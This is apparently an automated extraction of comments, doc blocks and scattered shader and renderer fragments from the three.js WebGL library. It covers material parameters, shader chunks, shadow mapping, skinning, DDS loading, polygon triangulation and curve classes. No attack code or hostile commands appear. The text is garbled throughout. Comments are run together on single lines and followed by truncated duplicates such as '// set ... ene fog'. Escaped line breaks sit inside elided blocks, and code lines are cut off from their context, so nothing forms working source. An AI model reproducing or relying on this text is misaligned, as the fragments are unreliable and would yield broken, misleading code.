 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  color: <hex>,
 *  ambient: <hex>,
 *  emissive: <hex>,
 *  opacity: <float>,
 *
 *  map: new THREE.Texture( <Image> ),
 *
 *  lightMap: new THREE.Texture( <Image> ),
 *
 *  specularMap: new THREE.Texture( <Image> ),
 *
 *  envMap: new THREE.TextureCube( [posx, negx, posy, negy, posz, negz] ),
 *  combine: THREE.Multiply,
 *  reflectivity: <float>,
 *  refractionRatio: <float>,
 *
 *  shading: THREE.SmoothShading,
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  wireframe: <boolean>,
 *  wireframeLinewidth: <float>,
 *
 *  vertexColors: THREE.NoColors / THREE.VertexColors / THREE.FaceColors,
 *
 *  skinning: <bool>,
 *  morphTargets: <bool>,
 *  morphNormals: <bool>,
 *
 *	fog: <bool>
 * }
  diffuse// diffuse
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  color: <hex>,
 *  ambient: <hex>,
 *  emissive: <hex>,
 *  specular: <hex>,
 *  shininess: <float>,
 *  opacity: <float>,
 *
 *  map: new THREE.Texture( <Image> ),
 *
 *  lightMap: new THREE.Texture( <Image> ),
 *
 *  bumpMap: new THREE.Texture( <Image> ),
 *  bumpScale: <float>,
 *
 *  normalMap: new THREE.Texture( <Image> ),
 *  normalScale: <Vector2>,
 *
 *  specularMap: new THREE.Texture( <Image> ),
 *
 *  envMap: new THREE.TextureCube( [posx, negx, posy, negy, posz, negz] ),
 *  combine: THREE.Multiply,
 *  reflectivity: <float>,
 *  refractionRatio: <float>,
 *
 *  shading: THREE.SmoothShading,
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  wireframe: <boolean>,
 *  wireframeLinewidth: <float>,
 *
 *  vertexColors: THREE.NoColors / THREE.VertexColors / THREE.FaceColors,
 *
 *  skinning: <bool>,
 *  morphTargets: <bool>,
 *  morphNormals: <bool>,
 *
 *	fog: <bool>
 * }
 
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  opacity: <float>,
 *
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  wireframe: <boolean>,
 *  wireframeLinewidth: <float>
 * }
 
 * @author mrdoob / http://mrdoob.com/
 *
 * parameters = {
 *  opacity: <float>,
 *
 *  shading: THREE.FlatShading,
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  wireframe: <boolean>,
 *  wireframeLinewidth: <float>
 * }
 
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  color: <hex>,
 *  opacity: <float>,
 *  map: new THREE.Texture( <Image> ),
 *
 *  size: <float>,
 *
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  vertexColors: <bool>,
 *
 *  fog: <bool>
 * }
 
 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  fragmentShader: <string>,
 *  vertexShader: <string>,
 *
 *  uniforms: { "parameter1": { type: "f", value: 1.0 }, "parameter2": { type: "i" value2: 2 } },
 *
 *  defines: { "label" : "value" },
 *
 *  shading: THREE.SmoothShading,
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  wireframe: <boolean>,
 *  wireframeLinewidth: <float>,
 *
 *  lights: <bool>,
 *
 *  vertexColors: THREE.NoColors / THREE.VertexColors / THREE.FaceColors,
 *
 *  skinning: <bool>,
 *  morphTargets: <bool>,
 *  morphNormals: <bool>,
 *
 *	fog: <bool>
 * }
  set to use scene fog// set  ... ene fog set to use scene lights// set  ...  lights set to use "color" attribute stream// set  ...  stream set to use skinning attribute streams// set  ... streams set to use morph targets// set  ... targets set to use morph normals// set  ... normals When rendered geometry doesn't include these attributes but the material does,// When ... l does, use these default values in WebGL. This avoids errors when buffer data is missing.// use  ... issing.
 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  color: <hex>,
 *  opacity: <float>,
 *  map: new THREE.Texture( <Image> ),
 *
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *	uvOffset: new THREE.Vector2(),
 *	uvScale: new THREE.Vector2(),
 *
 *  fog: <bool>
 * }
  set parameters// set parameters
 * @author mrdoob / http://mrdoob.com/
 *
 * parameters = {
 *  color: <hex>,
 *  program: <function>,
 *  opacity: <float>,
 *  blending: THREE.NormalBlending
 * }
 
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 * @author szimek / https://github.com/szimek/
 /**\r\n * ... k/\r\n */ valid values: 1, 2, 4, 8 (see http://www.khronos.org/opengles/sdk/docs/man/xhtml/glPixelStorei.xml)// vali ... ei.xml) WebGL currently can't generate mipmaps for compressed textures, they must be embedded in DDS file// WebG ... DS file
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 * @author mikael emtinger / http://gomo.se/
 * @author jonobr1 / http://jonobr1.com/
 
 * @author mikael emtinger / http://gomo.se/
 * @author alteredq / http://alteredqualia.com/
  update local// update local update skin matrix// upda ...  matrix Reset weights to be re-accumulated in the next frame// Rese ... t frame
 * @author mikael emtinger / http://gomo.se/
 * @author alteredq / http://alteredqualia.com/
 * @author michael guerrero / http://realitymeltdown.com
  init bones// init bones layout (1 matrix = 4 pixels)// layo ... pixels)  RGBA RGBA RGBA RGBA (=> column1, column2, column3, column4)//  RGB ... olumn4)  with  8x8  pixel texture max   16 bones  (8 * 8  / 4)//  wit ... 8  / 4)     16x16 pixel texture max   64 bones (16 * 16 / 4)//      ... 16 / 4)     32x32 pixel texture max  256 bones (32 * 32 / 4)//      ... 32 / 4)     64x64 pixel texture max 1024 bones (64 * 64 / 4)//      ... 64 / 4) 4 floats per RGBA pixel// 4 fl ... A pixel Add root level bones as children of the mesh// Add  ... he mesh update matrixWorld// upda ... ixWorld make a snapshot of the bones' rest position// make ... osition flatten bone matrices to array// flat ... o array compute the offset between the current and the original transform;// comp ... nsform; TODO: we could get rid of this multiplication step if the skinMatrix// TODO ... nMatrix was already representing the offset; however, this requires some// was  ... es some major changes to the animation system// majo ...  system this will be normalized by the shader anyway// this ...  anyway skinning weights assumed to be normalized for THREE.BufferGeometry// skin ... eometry milliseconds// milliseconds
 * @author mikael emtinger / http://gomo.se/
 * @author alteredq / http://alteredqualia.com/
 * @author mrdoob / http://mrdoob.com/
 
 * Custom update matrix
 /*\r\n *  ... ix\r\n */ Backwards compatibility// Back ... ibility checked by the renderer// chec ... enderer check if previously removed// chec ... removed check if previously added// chec ... y added Needed for PointLight// Need ... ntLight dash+gap fallbacks for Firefox and everything else// dash ... ng else WebGLRenderer compatibility// WebG ... ibility compatibility// compatibility DEBUG
		setFillStyle( 'rgba( 0, 255, 255, 0.5 )' );
		_context.fillRect( _clipBox.min.x, _clipBox.min.y, _clipBox.max.x - _clipBox.min.x, _clipBox.max.y - _clipBox.min.y );
		/* DEBU ... ;\r\n\t\t*/ DEBUG
			setLineWidth( 1 );
			setStrokeStyle( 'rgba( 0, 255, 0, 0.5 )' );
			_context.strokeRect( _elemBox.min.x, _elemBox.min.y, _elemBox.max.x - _elemBox.min.x, _elemBox.max.y - _elemBox.min.y );
			/* DEBU ... \r\n\t\t\t*/ DEBUG
		setLineWidth( 1 );
		setStrokeStyle( 'rgba( 255, 0, 0, 0.5 )' );
		_context.strokeRect( _clearBox.min.x, _clearBox.min.y, _clearBox.max.x - _clearBox.min.x, _clearBox.max.y - _clearBox.min.y );
		 _context.setTransform( 1, 0, 0, 1, 0, 0 );// _con ... 0, 0 ); for sprites// for sprites allow for rotated sprite// allo ...  sprite no texture// no texture DEBUG
		setStrokeStyle( 'rgb(255,255,0)' );
		_context.beginPath();
		_context.moveTo( v1.x - 10, v1.y );
		_context.lineTo( v1.x + 10, v1.y );
		_context.moveTo( v1.x, v1.y - 10 );
		_context.lineTo( v1.x, v1.y + 10 );
		_context.stroke();
		 http://extremelysatisfactorytotalitarianism.com/blog/?p=2120// http ... ?p=2120 Hide anti-alias gaps// Hide ... as gaps Context cached methods.// Cont ... ethods. "butt", "round", "square"// "but ... square" "round", "bevel", "miter"// "rou ... "miter"
 * Shader chunks for WebLG Shader library
 * 
 * @author alteredq / http://alteredqualia.com/
 * @author mrdoob / http://mrdoob.com/
 * @author mikael emtinger / http://gomo.se/
 /**\r\n * ... e/\r\n */ FOG// FOG ENVIRONMENT MAP// ENVIRONMENT MAP http://en.wikibooks.org/wiki/GLSL_Programming/Applying_Matrix_Transformations// http ... mations "Transforming Normal Vectors with the Inverse Transformation"// "Tra ... mation" COLOR MAP (particles)// COLO ... ticles) COLOR MAP (triangles)// COLO ... angles) LIGHT MAP// LIGHT MAP BUMP MAP// BUMP MAP Derivative maps - bump mapping unparametrized surfaces by Morten Mikkelsen// Deri ... kkelsen	http://mmikkelsen3d.blogspot.sk/2011/07/derivative-maps.html//\thttp ... ps.html Evaluate the derivative of the height w.r.t. screen-space using forward differencing (listing 2)// Eval ... ting 2) normalized// normalized NORMAL MAP// NORMAL MAP Per-Pixel Tangent Space Normal Mapping// Per- ... Mapping http://hacksoflife.blogspot.ch/2009/11/per-pixel-tangent-space-normal-mapping.html// http ... ng.html SPECULAR MAP// SPECULAR MAP LIGHTS LAMBERT// LIGHTS LAMBERT LIGHTS PHONG// LIGHTS PHONG specular// specular 2.0 => 2.0001 is hack to work around ANGLE bug// 2.0  ... GLE bug
				// fresnel term from skin shader
		"		const float F0 = 0.128;",

		"		float base = 1.0 - dot( viewPosition, dirHalfVector );",
		"		float exponential = pow( base, 5.0 );",

		"		float fresnel = exponential + F0 * ( 1.0 - exponential );",
				/*\r\n\t\t\t ... \n\t\t\t\t*/
				// fresnel term from fresnel shader
		"		const float mFresnelBias = 0.08;",
		"		const float mFresnelScale = 0.3;",
		"		const float mFresnelPower = 5.0;",

		"		float fresnel = mFresnelBias + mFresnelScale * pow( 1.0 + dot( normalize( -viewPosition ), normal ), mFresnelPower );",
				"dirSpecular += specular * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization * fresnel;",//"dirS ... snel;", specular (sky light)// spec ...  light) specular (ground light) VERTEX COLORS// VERTEX COLORS SKINNING// SKINNING MORPHING// MORPHING SHADOW MAP// SHADOW MAP based on SpiderGL shadow map and Fabien Sanglard's GLSL shadow mapping examples// base ... xamples  http://spidergl.org/example.php?id=6//  htt ... hp?id=6 	http://fabiensanglard.net/shadowmapping// \thtt ... mapping "if ( something && something )" 		 breaks ATI OpenGL shader compiler// "if  ... ompiler "if ( all( something, something ) )"  using this instead// "if  ... instead don't shadow pixels outside of light frustum// don' ... frustum use just first frustum (for cascades)// use  ... scades) don't shadow pixels behind far plane of light frustum Percentage-close filtering// Perc ... ltering (9 pixel kernel)// (9 pixel kernel) http://fabiensanglard.net/shadowmappingPCF/// http ... ingPCF/
						// nested loops breaks shader compiler / validator on some ATI cards when using OpenGL
						// must enroll loop manually

		"				for ( float y = -1.25; y <= 1.25; y += 1.25 )",
		"					for ( float x = -1.25; x <= 1.25; x += 1.25 ) {",

		"						vec4 rgbaDepth = texture2D( shadowMap[ i ], vec2( x * xPixelOffset, y * yPixelOffset ) + shadowCoord.xy );",

								// doesn't seem to produce any noticeable visual difference compared to simple "texture2D" lookup
								//"vec4 rgbaDepth = texture2DProj( shadowMap[ i ], vec4( vShadowCoord[ i ].w * ( vec2( x * xPixelOffset, y * yPixelOffset ) + shadowCoord.xy ), 0.05, vShadowCoord[ i ].w ) );",

		"						float fDepth = unpackDepth( rgbaDepth );",

		"						if ( fDepth < shadowCoord.z )",
		"							shadow += 1.0;",

		"				}",

		"				shadow /= 9.0;",

						/*\r\n\t\t\t ... \t\t\t\t\t*/ spot with multiple shadows is darker// spot ...  darker spot with multiple shadows has the same color as single shadow spot// spot ... ow spot"shadowColor = min( shadowColor, vec3( shadowDarkness[ i ] ) );",//"shad ...  ) );", ALPHATEST// ALPHATEST LINEAR SPACE// LINEAR SPACE LOGARITHMIC DEPTH BUFFER// LOGA ...  BUFFER http://outerra.blogspot.com/2012/11/maximizing-depth-buffer-range-and.html// http ... nd.html WebGL doesn't support gl_FragDepth out of the box, unless the EXT_frag_depth extension is available.  On platforms// WebG ... atforms without EXT_frag_depth, we have to fall back on linear z-buffer in the fragment shader, which means that some long // with ... e long  faces close to the camera may have issues.	This can be worked around by tesselating the model more finely when// face ... ly when the camera is near the surface.// the  ... urface.
 * Uniform Utilities
 /**\r\n * ... es\r\n */
 * Uniforms library for shared webgl shaders
 /**\r\n * ... rs\r\n */
 * Webgl Shader Library for three.js
 *
 * @author alteredq / http://alteredqualia.com/
 * @author mrdoob / http://mrdoob.com/
 * @author mikael emtinger / http://gomo.se/
 "float isFront = float( gl_FrontFacing );",//"floa ... ng );","gl_FragColor.xyz *= isFront * vLightFront + ( 1.0 - isFront ) * vLightBack;",//"gl_F ... Back;", -------------------------------------------------------------------------
	//	Normal map shader
	//		- Blinn-Phong
	//		- normal + diffuse + specular + AO + displacement + reflection + shadow maps
	//		- point and directional lights (use with "lights: true" material option)
	 ------------------------------------------------------------------------- /* ---- ... ---- */ must go first as this is vertex texture// must ... texture point lights// point lights spot lights// spot lights directional lights// dire ...  lights hemisphere lights// hemisphere lights all lights contribution summation// all  ... mmation normal, tangent and binormal vectors// norm ... vectors displacement mapping// disp ... mapping shadows// shadows -------------------------------------------------------------------------
	//	Cube map shader
	 -------------------------------------------------------------------------  Depth encoding into RGBA texture// Dept ... texture 	based on SpiderGL shadow map example// \tbas ... example 		http://spidergl.org/example.php?id=6// \t\tht ... hp?id=6 	originally from// \toriginally from		http://www.gamedev.net/topic/442138-packing-a-float-into-a-a8r8g8b8-texture-shader/page__whichpage__1%25EF%25BF%25BD//\t\thtt ... BF%25BD 	see also here:// \tsee also here:		http://aras-p.info/blog/2009/07/30/encoding-floats-to-rgba-the-final///\t\thtt ... -final/ "	vec4 res = fract( depth * bit_shift );",// "\tve ... ft );","gl_FragData[ 0 ] = pack_depth( gl_FragCoord.z / gl_FragCoord.w );",//"gl_F ... .w );","float z = ( ( gl_FragCoord.z / gl_FragCoord.w ) - 3.0 ) / ( 4000.0 - 3.0 );",//"floa ... .0 );","gl_FragData[ 0 ] = pack_depth( z );",//"gl_F ...  z );","gl_FragData[ 0 ] = vec4( z, z, z, 1.0 );",//"gl_F ... .0 );",
 * @author supereggbert / http://www.paulbrunt.co.uk/
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 * @author szimek / https://github.com/szimek/
  public properties// public properties clearing// clearing scene graph// scene graph physically based shading// phys ... shading shadow map// shadow map morphs// morphs flags// flags custom render plugins// cust ... plugins info// info internal properties// inte ... perties internal state cache// inte ... e cache GL state cache// GL state cache frustum// frustum camera matrices cache// came ... s cache light arrays cache// ligh ... s cache initialize// initialize GPU capabilities// GPU capabilities
	var _vertexShaderPrecisionHighpInt = _gl.getShaderPrecisionFormat( _gl.VERTEX_SHADER, _gl.HIGH_INT );
	var _vertexShaderPrecisionMediumpInt = _gl.getShaderPrecisionFormat( _gl.VERTEX_SHADER, _gl.MEDIUM_INT );
	var _vertexShaderPrecisionLowpInt = _gl.getShaderPrecisionFormat( _gl.VERTEX_SHADER, _gl.LOW_INT );

	var _fragmentShaderPrecisionHighpInt = _gl.getShaderPrecisionFormat( _gl.FRAGMENT_SHADER, _gl.HIGH_INT );
	var _fragmentShaderPrecisionMediumpInt = _gl.getShaderPrecisionFormat( _gl.FRAGMENT_SHADER, _gl.MEDIUM_INT );
	var _fragmentShaderPrecisionLowpInt = _gl.getShaderPrecisionFormat( _gl.FRAGMENT_SHADER, _gl.LOW_INT );
	/*\r\n\tva ... );\r\n\t*/ clamp precision to maximum available// clam ... ailable Clearing// Clearing Plugins// Plugins Rendering// Rendering Internal functions// Inte ... nctions Buffer allocation// Buffer allocation Events// Events Buffer deallocation// Buff ... ocation custom attributes// custom attributes cube texture// cube texture 2D texture// 2D texture only deallocate GL program if this was the last use of shared program// only ... program assumed there is only single copy of any program in the _programs list// assu ... ms list (that's how it's constructed)// (tha ... ructed) avoid using array.splice, this is costlier than creating new array from scratch// avoi ... scratch Buffer initialization// Buff ... ization "f" and "i"// "f" and "i" console.log( "uvType", uvType, "normalType", normalType, "vertexColorType", vertexColorType, object, geometryGroup, material );// cons ... rial ); 65535 / 3// 65535 / 3 Do a shallow copy of the attribute object so different geometryGroup chunks use different// Do a ... fferent attribute buffers which are correctly indexed in the setMeshBuffers function// attr ... unction only MeshBasicMaterial and MeshDepthMaterial don't need normals// only ... normals material must use some texture to require uvs// mate ... ire uvs Buffer setting// Buffer setting this is shared for all chunks// this ...  chunks morph positions// morph positions morph normals// morph normals weights// weights indices// indices Buffer rendering// Buffer rendering 4 bytes per Float32// 4 by ... Float32 render mesh// render mesh indexed triangles// indexed triangles not really true, here vertices can be shared// not  ...  shared if there is more than 1 chunk// if t ... 1 chunk must set attribute pointers to use new offsets for each chunk// must ... h chunk even if geometry and materials didn't change// even ...  change render indexed triangles// rend ... iangles non-indexed triangles// non- ... iangles render non-indexed triangles render particles// render particles indexed lines// indexed lines 2 bytes per Uint16Array// 2 by ... 16Array render indexed lines// rend ... d lines non-indexed lines// non-indexed lines Use the per-geometryGroup custom attribute arrays which are setup in initMeshBuffers// Use  ... Buffers normals// normals tangents// tangents line distances// line distances wireframe// wireframe triangles// triangles render lines// render lines set base// set base set forced order// set forced order find the most influencing// find ... uencing
					_gl.vertexAttribPointer( attributes[ "morphTarget" + m ], 3, _gl.FLOAT, false, 0, 0 );

					if ( material.morphNormals ) {

						_gl.vertexAttribPointer( attributes[ "morphNormal" + m ], 3, _gl.FLOAT, false, 0, 0 );

					}
					 load updated influences uniform// load ... uniform Sorting// Sorting reset caching for this frame// rese ... s frame update scene graph// upda ... e graph update camera matrices and frustum// upda ... frustum update WebGL objects// upda ... objects custom render plugins (pre pass)// cust ... e pass) set matrices for regular objects (frustum culled)// set  ... culled) set matrices for immediate objects// set  ... objects opaque pass (front-to-back order)// opaq ...  order) transparent pass (back-to-front order)// tran ...  order) custom render plugins (post pass)// cust ... t pass) Generate mipmap if we're using any kind of mipmap filtering// Gene ... ltering Ensure depth buffer writing is enabled so it can be cleared on next render// Ensu ...  render _gl.finish();// _gl.finish(); reset state for plugin (to start from clean slate)// rese ...  slate) reset state after plugin (anything could have changed)// rese ... hanged) Objects refresh// Objects refresh update must be called after objects adding / removal// upda ... removal TODO: Remove this hack (WebGLRenderer refactoring)// TODO ... toring) Objects adding// Objects adding ImmediateRenderObject// Imme ... rObject create separate VBOs per geometry chunk// crea ... y chunk initialise VBO on the first access// init ...  access Objects updates// Objects updates check all geometry groups// chec ...  groups Objects updates - custom attributes check// Obje ... s check Objects removal// Objects removal Materials// Materials heuristics to create shader parameters according to lights in the scene// heur ... e scene (not to blow over maxLights budget)// (not ... budget) Generate code// Generate code Check if code has been already compiled// Chec ... ompiled skinning uniforms must be set even if material didn't change// skin ...  change auto-setting of texture unit for bone texture must go before other textures// auto ... extures not sure why, but otherwise weird things happen// not  ...  happen refresh uniforms common to several materials// refr ... terials refresh single material specific uniforms// refr ... niforms load common uniforms// load ... niforms load material specific uniforms (shader material also gets them for the sake of genericity)// (sha ... ricity) Uniforms (refresh uniforms objects)// Unif ... bjects) uv repeat and offset setting priorities// uv r ... orities  1. color map//  1. color map  2. specular map//  2. specular map  3. normal map//  3. normal map  4. bump map//  4. bump mapuniforms.reflectivity.value = material.reflectivity * material.reflectivity;//unifo ... tivity; TODO: Cache this.// TODO: Cache this. Uniforms (load to GPU)// Unif ... to GPU) single integer// single integer single float// single float single THREE.Vector2// sing ... Vector2 single THREE.Vector3// sing ... Vector3 single THREE.Vector4// sing ... Vector4 single THREE.Color// sing ... E.Color flat array of integers (JS or typed array)// flat ...  array) flat array of integers with 3 x N size (JS or typed array) flat array of floats (JS or typed array) flat array of floats with 3 x N size (JS or typed array) array of THREE.Vector2// arra ... Vector2 array of THREE.Vector3// arra ... Vector3 array of THREE.Vector4// arra ... Vector4 single THREE.Matrix3// sing ... Matrix3 array of THREE.Matrix3// arra ... Matrix3 single THREE.Matrix4// sing ... Matrix4 array of THREE.Matrix4// arra ... Matrix4 single THREE.Texture (2d or cube)// sing ... r cube) array of THREE.Texture (2d)// arra ... re (2d) skip lights with undefined direction// skip ... rection these create troubles in OpenGL (making pixel black)// thes ...  black) null eventual remains from removed lights// null ...  lights (this is to avoid if in shader)// (thi ... shader) GL state setting// GL state setting TODO: Find blendFuncSeparate() combination// TODO ... ination Textures// Textures use manually created mipmaps if available// use  ... ailable if there are no manual mipmaps// if t ... mipmaps set 0 level mipmap and then use GL to generate other mipmap levels// set  ...  levels regular Texture (image, video, canvas)// regu ... canvas) Warning: Scaling through the canvas will only work with images that use// Warn ... hat use premultiplied alpha.// prem ...  alpha. Render targets// Render targets For some reason this is not working. Defaulting to RGBA4.
		} else if( ! renderTarget.depthBuffer && renderTarget.stencilBuffer ) {

			_gl.renderbufferStorage( _gl.RENDERBUFFER, _gl.STENCIL_INDEX8, renderTarget.width, renderTarget.height );
			_gl.framebufferRenderbuffer( _gl.FRAMEBUFFER, _gl.STENCIL_ATTACHMENT, _gl.RENDERBUFFER, renderbuffer );
		/* For  ... ;\r\n\t\t*/ Setup texture, create render and frame buffers// Setu ... buffers Release everything// Rele ... rything Fallback filters for non-power-of-2 textures// Fall ... extures Map three.js constants to WebGL constants// Map  ... nstants Allocations// Allocations default for when object is not specified// defa ... ecified ( for example when prebuilding shader// ( fo ...  shader   to be used with multiple objects )//   to ... jects )  - leave some extra space for other uniforms//  - l ... niforms  - limit here is ANGLE's 254 max uniform vectors//  - l ... vectors    (up to 54 should be safe)//    ( ... e safe) Initialization// Initialization default plugins (order is important)// defa ... ortant)
 * @author szimek / https://github.com/szimek/
 * @author alteredq / http://alteredqualia.com/
 
 * @author alteredq / http://alteredqualia.com
  PX 0, NX 1, PY 2, NY 3, PZ 4, NZ 5// PX 0 ... 4, NZ 5 programs with morphTargets displace position out of attribute 0// prog ... ibute 0 console.log( "building new program " );// cons ... am " );_this._glExtensionFragDepth ? "#define USE_LOGDEPTHBUF_EXT" : "",//_this ... " : "", Force a particular attribute to index 0.// Forc ... ndex 0. because potentially expensive emulation is done by browser if attribute 0 is disabled.// beca ... sabled. And, color, for example is often automatically bound to index 0 so disabling it// And, ... ling it clean up// clean up cache uniform locations// cach ... cations cache attributes locations --enable-privileged-webgl-extension// --en ... tension console.log( type, gl.getExtension( 'WEBGL_debug_shaders' ).getTranslatedShaderSource( shader ) );// cons ... er ) ); Merge two geometries or geometry and geometry from object (using object's transform)// Merg ... nsform) Get random point in triangle (via barycentric coordinates)// Get  ... inates) 	(uniform distribution)// \t(un ... bution) 	http://www.cgafaq.info/wiki/Random_Point_In_Triangle// \thtt ... riangle Get random point in face (triangle)// Get  ... iangle) (uniform distribution)// (uni ... bution) Get uniformly distributed random points in mesh// Get  ... in mesh 	- create array with cumulative sums of face areas// \t- c ... e areas  - pick random number from 0 to total area//  - p ... al area  - find corresponding place in area array by binary search//  - f ...  search	- get random point in face//\t- ge ... in face precompute face areas// prec ... e areas binary search cumulative areas array// bina ... s array return closest larger index// retu ... r index if exact number is not found// if e ... t found pick random face weighted by face area// pick ... ce area Get triangle area (half of parallelogram)// Get  ... logram)	http://mathworld.wolfram.com/TriangleArea.html//\thttp ... ea.html Center geometry so that 0,0,0 is in center of bounding box// Cent ... ing box gl.generateMipmap fails for compressed textures// gl.g ... extures mipmaps must be embedded in the DDS file// mipm ... DS file or texture filters must not use mipmapping// or t ... mapping no flipping needed for cube textures// no f ... extures no flipping for cube textures (also flipping doesn't work for compressed textures )// (als ... tures ) can't generate mipmaps for compressed textures// can' ... extures mips must be embedded in DDS files// mips ... S files compressed cubemap textures as 6 separate DDS files// comp ... S files compressed cubemap texture stored in a single DDS file// comp ... DS file Adapted from @toji's DDS utils// Adap ... S utils	https://github.com/toji/webgl-texture-utils/blob/master/texture-util/dds.js//\thttp ... /dds.js All values and structures referenced from:// All  ... d from: http://msdn.microsoft.com/en-us/library/bb943991.aspx/// http ... 1.aspx///r//g//b//a The header length in 32 bit ints// The  ... it ints Offsets into the header array// Offs ... r array Parse header// Parse headerTODO: Verify that all faces of the cubemap are present with DDSCAPS2_CUBEMAP_POSITIVEX, etc.//TODO: ... X, etc. Extract mipmaps buffers// Extr ... buffers Adapted from http://www.paulbrunt.co.uk/lab/heightnormal/// Adap ... normal/
 * @author zz85 / http://www.lab4games.net/zz85/blog
 * @author alteredq / http://alteredqualia.com/
 *
 * For Text operations in three.js (See TextGeometry)
 *
 * It uses techniques used in:
 *
 * 	typeface.js and canvastext
 * 		For converting fonts and rendering with javascript
 *		http://typeface.neocracy.org
 *
 *	Triangulation ported from AS3
 *		Simple Polygon Triangulation
 *		http://actionsnippet.com/?p=1462
 *
 * 	A Method to triangulate shapes with holes
 *		http://www.sakri.net/blog/2009/06/12/an-approach-to-triangulating-polygons-with-holes/
 *
 /**\r\n * ...  *\r\n */ Just for now. face[weight][style]// Just ... [style] RenderText// RenderText get the width// get the width for ( p = 0; p < allPts.length; p++ ) {// for  ... p++ ) { 	allPts[ p ].x -= width;// \tall ...  width; }// }var extract = this.extractPoints( allPts, characterPts );//var e ... rPts );extract.contour = allPts;//extra ... allPts;extract.paths = fontPaths;//extra ... tPaths;extract.offset = width;//extra ...  width;console.log( action );//conso ... tion ); Move To// Move To Line To// Line To QuadraticCurveTo// QuadraticCurveTo Cubic Bezier Curve// Cubi ... r Curve Parameters // Parameters  Get a Font data json object// Get  ...  object
 * This code is a quick port of code written in C++ which was submitted to
 * flipcode.com by John W. Ratcliff  // July 22, 2000
 * See original code and more information here:
 * http://www.flipcode.com/archives/Efficient_Polygon_Triangulation.shtml
 *
 * ported to actionscript by Zevan Rosser
 * www.actionsnippet.com
 *
 * ported to javascript by Joshua Koo
 * http://www.lab4games.net/zz85/blog
 *
  takes in an contour array and returns// take ... returns we want a counter-clockwise polygon in verts /* we w ... erts */  remove nv - 2 vertices, creating 1 triangle every time /*  rem ... time */ error detection /* erro ... tion */ if we loop, it is probably a non-simple polygon /* if w ... ygon */** Triangulate: ERROR - probable bad polygon!//** Tr ... olygon!throw ( "Warning, unable to triangulate polygon!" );//throw ... on!" );//return null; Sometimes warning is fine, especially polygons are triangulated in reverse.// Some ... everse. three consecutive vertices in current polygon, <u,v,w> /* thre ... v,w> */ previous /* previous */ new v    /* new v    */ next     /* next     */ true names of the vertices /* true ... ices */ output Triangle /* outp ... ngle */ remove v from the remaining polygon /* remo ... ygon */ reset error detection counter /* rese ... nter */ calculate area of the contour polygon// calc ... polygon see if p is inside triangle abc// see  ... gle abc To use the typeface.js face files, hook up the API// To u ... the API
 * @author zz85 / http://www.lab4games.net/zz85/blog
 * Extensible curve object
 *
 * Some common of Curve methods
 * .getPoint(t), getTangent(t)
 * .getPointAt(u), getTagentAt(u)
 * .getPoints(), .getSpacedPoints()
 * .getLength()
 * .updateArcLengths()
 *
 * This following classes subclasses THREE.Curve:
 *
 * -- 2d classes --
 * THREE.LineCurve
 * THREE.QuadraticBezierCurve
 * THREE.CubicBezierCurve
 * THREE.SplineCurve
 * THREE.ArcCurve
 * THREE.EllipseCurve
 *
 * -- 3d classes --
 * THREE.LineCurve3
 * THREE.QuadraticBezierCurve3
 * THREE.CubicBezierCurve3
 * THREE.SplineCurve3
 * THREE.ClosedSplineCurve3
 *
 * A series of curves can be represented as a THREE.CurvePath
 *
 */**\r\n * ... *\r\n **/************************************************************
 *	Abstract Curve base class
 *************************************************************/****** ... ******/ Virtual base class method to overwrite and implement in subclasses// Virt ... classes	- t [0 .. 1]//\t- t [0 .. 1] Get point at relative position in curve according to arc length// Get  ...  length - u [0 .. 1]// - u [0 .. 1] Get sequence of points using getPoint( t )// Get  ... nt( t ) Get sequence of points using getPointAt( u )// Get  ... At( u ) Get total curve arc length Get list of cumulative segment lengths// Get  ... lengthsconsole.log( "cached", this.cacheArcLengths );//conso ... gths ); { sums: cache, sum:sum }; Sum is in the last element.// { su ... lement. Given u ( 0 .. 1 ), get a t to find p. This gives you points which are equi distance// Give ... istance The targeted u distance value to get// The  ...  to getvar time = Date.now();//var t ... .now(); binary search for the index with largest value smaller than target u distance// bina ... istance less likely to overflow, though probably not issue here, JS doesn't really have integers, all numbers are floats// less ...  floats DONE// DONEconsole.log('b' , i, low, high, Date.now()- time);//conso ...  time); we could get finer grain at lengths, or use simple interpolatation between two points// we c ...  points determine where we are between the 'before' and 'after' points// dete ...  points add that fractional amount to t// add  ... nt to t Returns a unit vector tangent at t// Retu ... nt at t In case any sub curve does not implement its tangent derivation,// In c ... vation, 2 points a small delta apart will be used to find its gradient// 2 po ... radient which seems to give a reasonable approximation// whic ... imation Capping in case of danger// Capp ...  danger************************************************************
 *	Utils
 ************************************************************* Puay Bing, thanks for helping with this derivative!// Puay ... vative! To check if my formulas are correct// To c ... correct derived from 2t^3  3t^2 + 1// deri ... t^2 + 1 t^3  2t^2 + t// t^3 \u2212 2t^2 + t  2t3 + 3t2// \u2212 2t3 + 3t2 t3  t2// t3 \u2212 t2 TODO: Transformation for Curves?// TODO ... Curves?************************************************************
 *	3D Curves
 ************************************************************* A Factory method for creating new curve subclasses// A Fa ... classes
 * @author zz85 / http://www.lab4games.net/zz85/blog
 *
 *************************************************************
 *	Curved Path - a curve path is simply a array of connected
 *  curves, but retains the api of a curve
